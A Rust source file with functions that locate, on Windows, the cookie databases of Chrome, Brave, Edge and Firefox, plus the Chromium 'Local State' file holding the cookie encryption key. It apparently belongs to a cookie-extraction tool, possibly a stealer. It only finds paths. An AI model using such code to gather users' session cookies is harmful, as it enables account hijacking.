use std::{env, path::{self, PathBuf}};
use crate::mozilla::get_default_profile;

pub fn find_chrome_paths() -> (PathBuf, PathBuf) {
    let appdata_path = env::var("APPDATA").unwrap();
    let appdata_path = path::Path::new(appdata_path.as_str());
    let user_data_path = appdata_path.join("../local/Google/Chrome/User Data");
    let key_path = user_data_path.join("Local State");
    let db_path = user_data_path.join("Default/Network/Cookies");
    (key_path, db_path)
}



pub fn find_brave_paths() -> (PathBuf, PathBuf) {
    let appdata_path = env::var("APPDATA").unwrap();
    let appdata_path = path::Path::new(appdata_path.as_str());
    
    let user_data_path = appdata_path.join("../local/BraveSoftware/Brave-Browser/User Data");
    let key_path = user_data_path.join("Local State");
    let db_path = user_data_path.join("Default/Network/Cookies");
    (key_path, db_path)
}


pub fn find_edge_paths() -> (PathBuf, PathBuf) {
    let appdata_path = env::var("APPDATA").unwrap();
    let appdata_path = path::Path::new(appdata_path.as_str());
    
    let user_data_path = appdata_path.join("../local/Microsoft/Edge/User Data");
    let key_path = user_data_path.join("Local State");
    let db_path = user_data_path.join("Default/Network/Cookies");
    (key_path, db_path)
}



pub fn find_firefox_paths() -> PathBuf {
    let appdata_path = env::var("APPDATA").unwrap();
    let appdata_path = path::Path::new(appdata_path.as_str());
    let default_profile = get_default_profile(appdata_path).unwrap();
    let db_path = appdata_path.join("Mozilla/Firefox/").join(default_profile).join("cookies.sqlite");    
    db_path
}
